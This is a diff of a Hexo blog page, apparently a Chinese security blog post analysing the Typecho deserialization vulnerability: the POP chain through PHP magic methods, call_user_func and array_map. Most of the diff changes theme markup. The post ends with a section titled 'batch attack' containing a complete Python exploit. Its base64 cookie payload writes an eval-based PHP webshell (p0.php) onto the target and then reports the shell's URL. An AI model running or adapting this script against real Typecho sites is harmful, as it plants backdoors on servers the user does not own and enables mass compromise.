@@ -1,19 +1,58 @@
 <!DOCTYPE html>
 
 
-  <html class="light page-post">
 
 
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
-  
-  <title>Typecho 反序列化漏洞分析 | Threezh1&#39;s blog</title>
 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<html lang="Chinese">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
+  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
 
-  
-    <meta name="keywords" content="代码审计,">
-  
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    }
+  };
+</script>
 
   <meta name="description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
 <meta name="keywords" content="代码审计">
@@ -23,153 +62,233 @@
 <meta property="og:site_name" content="Threezh1&#39;s blog">
 <meta property="og:description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
 <meta property="og:locale" content="Chinese">
-<meta property="og:updated_time" content="2019-05-17T04:16:10.022Z">
+<meta property="og:updated_time" content="2019-08-23T06:18:29.189Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Typecho 反序列化漏洞分析">
 <meta name="twitter:description" content="漏洞分析：思路 在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置_typecho_config进行反序列化。 在序列化当中把adapter设置为一个类，导致页面执行代码时触发_toString()魔术方法。 在序列化当中设置$item令其没有screenName属性，导致在触发_toString()魔术方法的时候触发_get()魔术方法。 通过反序列化间">
-
-  
-
-  
-    <link rel="icon" href="/favicon.ico">
-  
-
-  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+  <link rel="canonical" href="http://yoursite.com/2018/01/01/Typecho反序列化漏洞分析/">
 
 
-  
-    <link rel="stylesheet" href="/css/personal-style.css">
-  
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
 
-  
-
-  
-
+  <title>Typecho 反序列化漏洞分析 | Threezh1's blog</title>
+  <meta name="generator" content="Hexo 3.8.0">
   
 
 
-  
-    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
-  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
 </head>
-</html>
-<body>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-  
-    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
-  
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
 
-  <div class="post-header CENTER">
-   
-  <div class="toolbox">
-    <a class="toolbox-entry" href="/">
-      <span class="toolbox-entry-text">盒子</span>
-      <i class="icon-angle-down"></i>
-      <i class="icon-home"></i>
-    </a>
-    <ul class="list-toolbox">
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Threezh1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">分享学习、分享想法</p>
       
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="/archives/" rel="noopener noreferrer" target="_self">
-            博客
-          </a>
-        </li>
-      
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="/category/" rel="noopener noreferrer" target="_self">
-            分类
-          </a>
-        </li>
-      
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="/tag/" rel="noopener noreferrer" target="_self">
-            标签
-          </a>
-        </li>
-      
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="/link/" rel="noopener noreferrer" target="_self">
-            友链
-          </a>
-        </li>
-      
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="/about/" rel="noopener noreferrer" target="_self">
-            关于
-          </a>
-        </li>
-      
-        <li class="item-toolbox">
-          <a class="ROUND_RECT" href="http://119.3.219.188/" rel="noopener noreferrer" target="_blank">
-            Threeday
-          </a>
-        </li>
-      
-    </ul>
   </div>
 
-
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
 </div>
 
 
-  <div id="toc" class="toc-article">
-    <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析："><span class="toc-text">漏洞分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP反序列化漏洞可利用的魔术方法"><span class="toc-text">PHP反序列化漏洞可利用的魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#满足的条件为："><span class="toc-text">满足的条件为：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析过程："><span class="toc-text">分析过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#附上网络上的EXP："><span class="toc-text">附上网络上的EXP：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP分析"><span class="toc-text">EXP分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用过程："><span class="toc-text">利用过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-（把第一个参数作为回调函数调用）"><span class="toc-text">call_user_func （把第一个参数作为回调函数调用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map-（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）"><span class="toc-text">array_map() （函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pop链的利用"><span class="toc-text">pop链的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#批量打"><span class="toc-text">批量打</span></a></li></ol></li></ol>
-  </div>
-
-
-
-<div class="content content-post CENTER">
-   <article id="post-Typecho反序列化漏洞分析" class="article article-type-post" itemprop="blogPost">
-  <header class="article-header">
-    <h1 class="post-title">Typecho 反序列化漏洞分析</h1>
-
-    <div class="article-meta">
-      <span>
-        <i class="icon-calendar"></i>
-        <span>2018.01.01</span>
-      </span>
-
-      
-        <span class="article-author">
-          <i class="icon-user"></i>
-          <span>Threezh1</span>
-        </span>
-      
-
-      
-  <span class="article-category">
-    <i class="icon-list"></i>
-    <a class="article-category-link" href="/categories/Learning/">Learning</a>
-  </span>
-
-
-
-      
-
-      
-      <i class="fa fa-eye"></i> 
-        <span id="busuanzi_container_page_pv">
-           &nbsp热度 <span id="busuanzi_value_page_pv">
-           <i class="fa fa-spinner fa-spin"></i></span>℃
-        </span>
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
       
       
-    </div>
-  </header>
-
-  <div class="article-content">
+      
+        
+        <li class="menu-item menu-item-home">
+      
     
-      <h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-threeday">
+      
+    
+
+    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/01/Typecho反序列化漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Typecho 反序列化漏洞分析
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2018-01-01 12:00:00" itemprop="dateCreated datePublished" datetime="2018-01-01T12:00:00+08:00">2018-01-01</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:18:29" itemprop="dateModified" datetime="2019-08-23T14:18:29+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
 <li>在Typecho_Cookie::get()方法中通过POST或者设置COOKIE的方法设置<em>_typecho_config</em>进行反序列化。</li>
 <li>在序列化当中把adapter设置为一个类，导致页面执行代码时触发<em>_toString()</em>魔术方法。</li>
 <li>在序列化当中设置$item令其没有screenName属性，导致在触发<em>_toString()</em>魔术方法的时候触发<em>_get()</em>魔术方法。</li>
 <li>通过反序列化间接控制<em>$this-&gt;_filter</em>的值，利用array_map(),call_user_func()执行恶意代码。</li>
 </ol>
-<p><strong>可知，在利用漏洞的过程中，最终是要利用_toString(),_get()等魔术方法构造一个POC链，最终执行恶意代码</strong></p>
+<p><strong>可知，在利用漏洞的过程中，最终是要利用_toString(),_get()等魔术方法构造一个POC链，最终执行恶意代码</strong><br><a id="more"></a></p>
 <h3 id="PHP反序列化漏洞可利用的魔术方法"><a href="#PHP反序列化漏洞可利用的魔术方法" class="headerlink" title="PHP反序列化漏洞可利用的魔术方法"></a>PHP反序列化漏洞可利用的魔术方法</h3><pre><code>- __wakeup() //使用unserialize时触发
 - __sleep() //使用serialize时触发
 - __destruct() //对象被销毁时触发
@@ -332,140 +451,302 @@ Referrer=http://localhost/install.php
 
 把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。
 </code></pre><h3 id="批量打"><a href="#批量打" class="headerlink" title="批量打"></a>批量打</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url <span class="keyword">if</span> url.startswith(<span class="string">'http://'</span>) <span class="keyword">else</span> <span class="string">'http://'</span>+url</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    target = url+<span class="string">'/install.php?finish'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://localhost:85/install.php'</span>,</span><br><span class="line">        <span class="string">'cookie'</span>:<span class="string">"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url=target,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> html.status_code == <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'the file install.php is not exists'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'shell:'</span>, url+<span class="string">'p0.php'</span></span><br><span class="line">    <span class="keyword">except</span> Exception  ,e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">'http://localhost:85/'</span></span><br><span class="line">    poc(url)</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2018/01/01/phpmyadmin 4.8.1任意文件包含漏洞-CTF/" rel="next" title="phpmyadmin 4.8.1任意文件包含漏洞-CTF">
+                  <i class="fa fa-chevron-left"></i> phpmyadmin 4.8.1任意文件包含漏洞-CTF
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/01/01/XSS_02_XSS备忘录/" rel="prev" title="XSS O2 XSS备忘录">
+                  XSS O2 XSS备忘录 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
     
   </div>
+  
+  
+  
+  </article>
 
-</article>
-
-
-   
-
-   
-  <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2018/01/01/phpmyadmin 4.8.1任意文件包含漏洞-CTF/">
-        <i class="icon icon-angle-left"></i>
-    </a>
-    <a class="show pull-right" href="/2019/01/01/XSS_02_XSS备忘录/">
-        <i class="icon icon-angle-right"></i>
-    </a>
   </div>
 
 
+          </div>
+          
 
-
-</div>
-
-
-  <a id="backTop" class="back-top">
-    <i class="icon-angle-up"></i>
-  </a>
-
-
-
-
-  <div class="modal" id="modal">
-  <span id="cover" class="cover hide"></span>
-  <div id="modal-dialog" class="modal-dialog hide-dialog">
-    <div class="modal-header">
-      <span id="close" class="btn-close">关闭</span>
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-    <hr>
-    <div class="modal-body">
-      <ul class="list-toolbox">
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
         
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/archives/" rel="noopener noreferrer" target="_self">
-              博客
-            </a>
-          </li>
         
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/category/" rel="noopener noreferrer" target="_self">
-              分类
-            </a>
-          </li>
         
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/tag/" rel="noopener noreferrer" target="_self">
-              标签
-            </a>
-          </li>
         
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/link/" rel="noopener noreferrer" target="_self">
-              友链
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/about/" rel="noopener noreferrer" target="_self">
-              关于
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="http://119.3.219.188/" rel="noopener noreferrer" target="_blank">
-              Threeday
-            </a>
-          </li>
-        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+          Übersicht
+        </li>
       </ul>
 
-    </div>
-  </div>
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc">
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析："><span class="nav-number">1.</span> <span class="nav-text">漏洞分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP反序列化漏洞可利用的魔术方法"><span class="nav-number">1.2.</span> <span class="nav-text">PHP反序列化漏洞可利用的魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#满足的条件为："><span class="nav-number">1.3.</span> <span class="nav-text">满足的条件为：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析过程："><span class="nav-number">1.4.</span> <span class="nav-text">分析过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附上网络上的EXP："><span class="nav-number">1.5.</span> <span class="nav-text">附上网络上的EXP：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP分析"><span class="nav-number">1.6.</span> <span class="nav-text">EXP分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程："><span class="nav-number">1.7.</span> <span class="nav-text">利用过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">1.8.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.9.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func-（把第一个参数作为回调函数调用）"><span class="nav-number">1.9.1.</span> <span class="nav-text">call_user_func （把第一个参数作为回调函数调用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-map-（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）"><span class="nav-number">1.9.2.</span> <span class="nav-text">array_map() （函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pop链的利用"><span class="nav-number">1.9.3.</span> <span class="nav-text">pop链的利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#批量打"><span class="nav-number">1.10.</span> <span class="nav-text">批量打</span></a></li></ol></li></ol></div>
+          </div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Threezh1</p>
+  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
 </div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">schlagwörter</span>
+        
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+    
+  </div>
 
 
 
-  
-      <div class="fexo-comments comments-post">
-    
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Threezh1</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
 
     
-
-    
-    
-
-    
-
-    
-    
-
-    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
 
   </div>
 
   
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+<script src="/js/next-boot.js?v=7.3.0"></script>
 
-  <script type="text/javascript">
-  function loadScript(url, callback) {
-    var script = document.createElement('script')
-    script.type = 'text/javascript';
 
-    if (script.readyState) { //IE
-      script.onreadystatechange = function() {
-        if (script.readyState == 'loaded' ||
-          script.readyState == 'complete') {
-          script.onreadystatechange = null;
-          callback();
-        }
-      };
-    } else { //Others
-      script.onload = function() {
-        callback();
-      };
-    }
 
-    script.src = url;
-    document.getElementsByTagName('head')[0].appendChild(script);
-  }
+  
 
-  window.onload = function() {
-    loadScript('/js/bundle.js?235683', function() {
-      // load success
-    });
-  }
-</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/post-details.js?v=7.3.0"></script>
+
 
 </body>
 </html>
